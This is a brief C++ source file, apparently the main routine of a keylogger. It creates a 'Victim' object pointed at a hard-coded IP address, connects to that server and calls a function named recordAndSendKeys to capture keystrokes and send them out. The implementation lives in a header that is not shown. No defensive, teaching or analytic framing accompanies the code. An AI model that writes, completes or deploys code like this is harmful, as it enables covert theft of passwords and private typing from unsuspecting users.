#include "Victim.h"

int main() {
	Victim* victim = new Victim("3.142.167.4");

	victim->connectToServer();
	victim->recordAndSendKeys();

	return 0;
}